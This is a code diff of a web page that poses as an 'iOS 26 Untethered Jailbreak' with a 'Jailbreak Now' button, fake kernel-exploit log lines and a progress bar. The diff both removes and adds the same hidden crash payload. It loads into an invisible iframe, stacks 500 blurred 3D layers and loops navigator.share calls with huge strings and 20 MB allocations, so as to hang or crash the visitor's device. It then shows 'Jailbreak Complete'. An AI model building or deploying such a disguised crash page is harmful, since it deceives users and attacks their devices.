@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Jailbreak in Progress...</title>
+    <title>iOS 26 Jailbreak</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://unpkg.com/lucide@latest"></script>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&family=JetBrains+Mono&display=swap" rel="stylesheet">
@@ -14,145 +14,220 @@
             font-family: 'Inter', sans-serif;
             overflow: hidden;
             user-select: none;
+            -webkit-tap-highlight-color: transparent;
+        }
+        .jailbreak-gradient {
+            background: radial-gradient(circle at center, #111 0%, #000 100%);
         }
         .font-mono {
             font-family: 'JetBrains Mono', monospace;
         }
         .console-container::-webkit-scrollbar {
-            width: 0px;
+            width: 4px;
         }
-        @keyframes blink {
-            50% { opacity: 0; }
+        .console-container::-webkit-scrollbar-thumb {
+            background: #333;
+            border-radius: 2px;
         }
-        .cursor {
-            display: inline-block;
-            width: 6px;
-            height: 12px;
-            background: #fff;
-            animation: blink 1s step-end infinite;
-            vertical-align: middle;
-            margin-left: 2px;
+        @keyframes scan {
+            0% { transform: translateY(-100%); }
+            100% { transform: translateY(100%); }
+        }
+        .scan-line {
+            height: 2px;
+            background: linear-gradient(to right, transparent, rgba(255,255,255,0.2), transparent);
+            animation: scan 3s linear infinite;
         }
     </style>
 </head>
-<body class="min-h-screen flex flex-col items-center justify-center p-6 bg-black">
+<body class="jailbreak-gradient min-h-screen flex flex-col items-center justify-center p-6 bg-black">
 
-    <div id="simulation" class="w-full max-w-2xl space-y-10">
-        <!-- Status Header -->
+    <!-- WELCOME PHASE -->
+    <div id="welcome-screen" class="text-center space-y-8 max-w-md w-full">
+        <div class="flex justify-center">
+            <div class="w-24 h-24 rounded-[2rem] bg-white/5 backdrop-blur-xl border border-white/10 flex items-center justify-center shadow-2xl">
+                <i data-lucide="shield" class="w-12 h-12 text-white"></i>
+            </div>
+        </div>
+        
+        <div class="space-y-2">
+            <h1 class="text-4xl font-bold tracking-tight">iOS 26</h1>
+            <p class="text-white/60 text-lg">Untethered Jailbreak v1.0.4</p>
+        </div>
+
+        <button id="start-btn" class="group relative w-full py-4 px-8 bg-white text-black font-semibold rounded-2xl transition-all active:scale-95">
+            <span class="relative z-10 flex items-center justify-center gap-2">
+                <i data-lucide="download" class="w-5 h-5"></i>
+                Jailbreak Now
+            </span>
+        </button>
+
+        <p class="text-xs text-white/30">
+            Compatible with all A19 & A20 devices. Use at your own risk.
+        </p>
+    </div>
+
+    <!-- RUNNING PHASE -->
+    <div id="running-screen" class="hidden w-full max-w-2xl space-y-8">
         <div class="flex items-center justify-between px-2">
             <div class="flex items-center gap-3">
-                <i data-lucide="loader-2" class="w-5 h-5 animate-spin text-white/40"></i>
-                <span class="font-mono text-xs tracking-widest uppercase text-white/50">Injecting Exploit...</span>
+                <i data-lucide="loader-2" class="w-5 h-5 animate-spin text-white/60"></i>
+                <span class="font-mono text-sm tracking-widest uppercase text-white/60">Exploiting Kernel...</span>
             </div>
-            <span id="pct" class="font-mono text-sm font-bold">0%</span>
+            <span id="progress-text" class="font-mono text-sm">0%</span>
         </div>
 
-        <!-- Progress Bar -->
-        <div class="relative h-1 w-full bg-white/5 rounded-full overflow-hidden">
-            <div id="bar" class="absolute inset-y-0 left-0 bg-white transition-all duration-100" style="width: 0%"></div>
+        <div class="relative h-2 w-full bg-white/5 rounded-full overflow-hidden border border-white/5">
+            <div id="progress-bar" class="absolute inset-y-0 left-0 bg-white shadow-[0_0_20px_rgba(255,255,255,0.4)] transition-all duration-100" style="width: 0%"></div>
         </div>
 
-        <!-- Terminal -->
-        <div id="terminal" class="h-80 bg-white/[0.02] border border-white/5 rounded-3xl p-8 font-mono text-[10px] overflow-y-auto space-y-3 leading-relaxed">
+        <div id="console" class="console-container h-64 bg-white/5 backdrop-blur-md rounded-2xl border border-white/10 p-6 font-mono text-[10px] overflow-y-auto space-y-2">
+        </div>
+
+        <div class="grid grid-cols-2 gap-4">
+            <div class="bg-white/5 border border-white/10 rounded-xl p-4 flex items-center justify-between">
+                <div class="flex items-center gap-2 text-white/40">
+                    <i data-lucide="cpu" class="w-4 h-4"></i>
+                    <span class="text-[10px] uppercase tracking-wider">Chipset</span>
+                </div>
+                <span class="font-mono text-sm">A20X</span>
+            </div>
+            <div class="bg-white/5 border border-white/10 rounded-xl p-4 flex items-center justify-between">
+                <div class="flex items-center gap-2 text-white/40">
+                    <i data-lucide="zap" class="w-4 h-4"></i>
+                    <span class="text-[10px] uppercase tracking-wider">Power</span>
+                </div>
+                <span class="font-mono text-sm">Optimal</span>
+            </div>
         </div>
     </div>
 
-    <!-- Error Screen -->
-    <div id="error-screen" class="hidden fixed inset-0 z-[100] flex flex-col items-center justify-center bg-black">
-        <p id="fatal" class="hidden text-red-600 font-mono text-[8px] uppercase tracking-[0.5em] mb-4">Fatal Error: Kernel Panic</p>
-        <div class="opacity-10 scale-75">
-            <i data-lucide="shield-alert" class="w-12 h-12"></i>
+    <!-- FINAL PHASE -->
+    <div id="final-screen" class="hidden flex flex-col items-center justify-center space-y-4">
+        <div id="fatal-error" class="hidden text-[8px] font-mono text-red-500 uppercase tracking-widest animate-pulse">
+            Fatal Error: exploit_loop_overflow at 0x00FF2A
+        </div>
+        <div class="flex flex-col items-center gap-2 opacity-20">
+            <i data-lucide="check-circle-2" class="w-8 h-8"></i>
+            <p class="text-[10px] font-mono italic">Finalizing stage 3...</p>
         </div>
     </div>
 
-    <!-- Respring Hook -->
-    <div id="respring-view" class="hidden fixed inset-0 z-[200] bg-black flex flex-col items-center justify-center space-y-6">
-        <i data-lucide="loader-2" class="w-10 h-10 animate-spin text-white/30"></i>
-        <p class="font-mono text-[10px] tracking-widest text-white/20 uppercase">System Respring</p>
+    <!-- RESPRING OVERLAY -->
+    <div id="respring-overlay" class="hidden fixed inset-0 bg-black z-[9999] flex flex-col items-center justify-center space-y-6">
+        <div class="flex flex-col items-center gap-4 text-white/40 animate-pulse">
+            <i data-lucide="loader-2" class="w-12 h-12 animate-spin"></i>
+            <p class="text-sm font-mono tracking-widest uppercase">Respringing...</p>
+        </div>
+        <div class="fixed bottom-12 text-[10px] text-white/10 text-center font-mono uppercase space-y-1">
+            <p>© 2026 neonmodder123</p>
+            <p>Jailbreak Complete</p>
+        </div>
     </div>
 
-    <iframe id="hook" class="fixed pointer-events-none opacity-0 w-1 h-1" sandbox="allow-forms allow-modals allow-scripts allow-same-origin"></iframe>
+    <iframe id="exploit-iframe" class="fixed top-0 left-0 w-1 h-1 opacity-0 pointer-events-none" sandbox="allow-forms allow-modals allow-scripts allow-same-origin"></iframe>
+
+    <div class="fixed bottom-8 left-0 right-0 text-center opacity-10 pointer-events-none lowercase font-mono text-[10px]">
+        p0sixninja x geohot x neon
+    </div>
 
     <script>
         lucide.createIcons();
 
-        const commands = [
-            "Opening socket on port 1337...",
-            "Overwriting kptr_restrict...",
-            "Executing task_for_pid(0)...",
-            "Kernel base found at 0xFFFFFFF007004000",
-            "Bypassing KPP (Kernel Patch Protection)...",
-            "Applying AMFI patches...",
-            "Mounting / (rootfs) as r/w...",
-            "Extracting bootstrap.tar.gz...",
-            "Cleaning up auxiliary files...",
-            "Jailbreak success. Triggering final stage..."
+        const logs = [
+            "Initializing iOS 26 kernel exploit...",
+            "Targeting A20 Bionic architecture...",
+            "Bypassing PPL (Page Protection Layer)...",
+            "Escalating privileges to root...",
+            "Downloading stage 2 payload...",
+            "Patching amfid binaries...",
+            "Injecting custom kexts...",
+            "Signing system images (0x992)...",
+            "Verifying integrity of jailbreak...",
+            "Finalizing installation..."
         ];
 
-        let idx = 0;
-        let p = 0;
-        const term = document.getElementById('terminal');
+        let logIndex = 0;
+        let progress = 0;
 
-        function log() {
-            if (idx < commands.length) {
-                const row = document.createElement('div');
-                row.className = 'text-white/60';
-                row.innerHTML = `<span class="text-white/20">></span> ${commands[idx]}`;
-                term.appendChild(row);
-                term.scrollTop = term.scrollHeight;
-                idx++;
+        document.getElementById('start-btn').addEventListener('click', () => {
+            document.getElementById('welcome-screen').classList.add('hidden');
+            document.getElementById('running-screen').classList.remove('hidden');
+            startProcess();
+        });
+
+        function addLog() {
+            if (logIndex < logs.length) {
+                const consoleDiv = document.getElementById('console');
+                const logEl = document.createElement('div');
+                logEl.className = 'flex gap-3 opacity-0 translate-x-[-10px] transition-all duration-300';
+                logEl.innerHTML = `
+                    <span class="text-white/30">[${new Date().toLocaleTimeString()}]</span>
+                    <span class="text-white/80">${logs[logIndex]}</span>
+                `;
+                consoleDiv.appendChild(logEl);
+                setTimeout(() => {
+                    logEl.classList.remove('opacity-0', 'translate-x-[-10px]');
+                }, 10);
+                logIndex++;
+                consoleDiv.scrollTop = consoleDiv.scrollHeight;
             }
         }
 
-        const run = setInterval(() => {
-            p += 0.8;
-            if (p > 100) p = 100;
-            
-            document.getElementById('bar').style.width = p + '%';
-            document.getElementById('pct').innerText = Math.floor(p) + '%';
+        function startProcess() {
+            const interval = setInterval(() => {
+                progress += 0.5;
+                if (progress > 100) progress = 100;
+                
+                document.getElementById('progress-bar').style.width = progress + '%';
+                document.getElementById('progress-text').innerText = Math.floor(progress) + '%';
 
-            if (Math.random() > 0.9) log();
+                if (Math.random() > 0.93) addLog();
 
-            if (p >= 100) {
-                clearInterval(run);
-                setTimeout(end, 800);
-            }
-        }, 40);
+                if (progress >= 100) {
+                    clearInterval(interval);
+                    setTimeout(showError, 1000);
+                }
+            }, 30);
+        }
 
-        function end() {
-            document.getElementById('simulation').classList.add('hidden');
-            document.getElementById('error-screen').classList.remove('hidden');
+        function showError() {
+            document.getElementById('running-screen').classList.add('hidden');
+            document.getElementById('final-screen').classList.remove('hidden');
             
             setTimeout(() => {
-                document.getElementById('fatal').classList.remove('hidden');
-                setTimeout(respring, 1200);
-            }, 400);
+                document.getElementById('fatal-error').classList.remove('hidden');
+                setTimeout(triggerRespring, 1500);
+            }, 500);
         }
 
-        function respring() {
-            document.getElementById('error-screen').classList.add('hidden');
-            document.getElementById('respring-view').classList.remove('hidden');
+        function triggerRespring() {
+            document.getElementById('final-screen').classList.add('hidden');
+            document.getElementById('respring-overlay').classList.remove('hidden');
 
-            const frame = document.getElementById('hook');
-            frame.srcdoc = `
-                <html><body style="background:black">
-                <script>
-                    const c = document.createElement('div');
-                    c.style.cssText = 'perspective: 1px; perspective-origin: 9999999% 9999999%;';
-                    document.body.appendChild(c);
-                    for(let i=0; i<500; i++){
-                        let d = document.createElement('div');
-                        d.style.cssText = 'position: absolute; width: 100vw; height: 100vh; backdrop-filter: blur(100px); -webkit-backdrop-filter: blur(100px); transform: translate3d(100000px, 100000px, '+i+'px) rotateY(90deg); opacity: 0.99;';
-                        c.appendChild(d);
-                    }
-                    setInterval(() => {
-                        try { navigator.share({ title: 'R', text: 'R'.repeat(100000) }); } catch(e) {}
-                        let x = new Uint8Array(1024*1024*20);
-                        crypto.getRandomValues(x);
-                    }, 0);
-                <\/script>
-                </body></html>
+            const iframe = document.getElementById('exploit-iframe');
+            const exploit = `
+                <html>
+                <body style="background: black;">
+                    <script>
+                        const container = document.createElement('div');
+                        container.style.cssText = 'perspective: 1px; perspective-origin: 9999999% 9999999%;';
+                        document.body.appendChild(container);
+                        for (let i = 0; i < 500; i++) {
+                            let d = document.createElement('div');
+                            d.style.cssText = 'position: absolute; width: 100vw; height: 100vh; backdrop-filter: blur(100px); -webkit-backdrop-filter: blur(100px); transform: translate3d(100000px, 100000px, ' + i + 'px) rotateY(90deg); opacity: 0.99;';
+                            container.appendChild(d);
+                        }
+                        setInterval(() => {
+                            try { navigator.share({ title: 'R', text: 'R'.repeat(100000) }); } catch(e) {}
+                            let x = new Uint8Array(1024 * 1024 * 20);
+                            crypto.getRandomValues(x);
+                        }, 0);
+                    <\/script>
+                </body>
+                </html>
             `;
+            iframe.srcdoc = exploit;
         }
     </script>
 </body>
